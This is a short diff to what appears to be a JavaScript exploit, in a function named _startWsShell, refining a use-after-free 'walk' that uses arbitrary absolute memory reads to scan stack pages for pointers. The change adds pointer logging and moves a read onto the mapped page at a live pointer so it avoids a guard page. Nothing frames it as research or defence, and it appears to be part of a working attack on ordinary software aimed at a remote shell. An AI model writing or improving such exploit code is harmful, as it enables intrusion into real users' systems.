@@ -6222,6 +6222,7 @@ function _startWsShell(){
             if(S.BASE&&v>=S.BASE&&v<S.BASE+0x8000000n)return;
             for(var i9=0;i9<foreign9.length;i9++)if(foreign9[i9]===v)return;
             foreign9.push(v);
+            LB('F 0x'+v.toString(16));
           }
           /* (2) THE UAF WALK (fixed: m_ptr at +0x10) */
           try{
@@ -6324,7 +6325,11 @@ function _startWsShell(){
                     if(scanned9['S'+kSt9])continue;
                     scanned9['S'+kSt9]=1;
                     try{
-                      var sw9=S.absRead(sv9-0x1000n,0x1000);
+                      /* the page AT the live pointer - mapped by definition
+                       * (the session-172 lesson: some struct stack fields are
+                       * the stack BASE - reading below = the guard page) */
+                      var sp9=(sv9/0x1000n)*0x1000n;
+                      var sw9=S.absRead(sp9,0x1000);
                       for(var swi9=0;swi9<sw9.length;swi9++)addF(sw9[swi9]);
                       LB('s stack 0x'+sv9.toString(16)+' scanned');
                     }catch(eSt9){LB('s stack 0x'+sv9.toString(16)+' fail');}
